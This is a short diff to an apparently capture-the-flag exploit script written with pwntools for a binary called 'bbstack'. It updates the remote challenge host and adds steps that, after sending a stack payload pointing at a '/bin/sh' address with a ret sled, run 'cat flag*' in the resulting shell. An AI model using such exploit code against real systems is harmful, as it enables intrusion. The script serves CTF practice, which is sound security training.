@@ -13,7 +13,7 @@ vuln_path = "./bbstack"
 elf = ELF(vuln_path)
 libc = elf.libc
 
-io = process([vuln_path]) if not f_remote else remote("pwn-e354788b9a.challenge.xctf.org.cn", 9999, ssl=True) 
+io = process([vuln_path]) if not f_remote else remote("pwn-231b60695f.challenge.xctf.org.cn", 9999, ssl=True) 
 
 
 def ddebug(b=""):
@@ -119,5 +119,7 @@ pause()
 payload = p64(0x4048f8)  # binsh
 payload += p64(ret) * 30
 io.send(payload)
+pause()
+io.sendline(b"cat flag*")
 
 io.interactive()
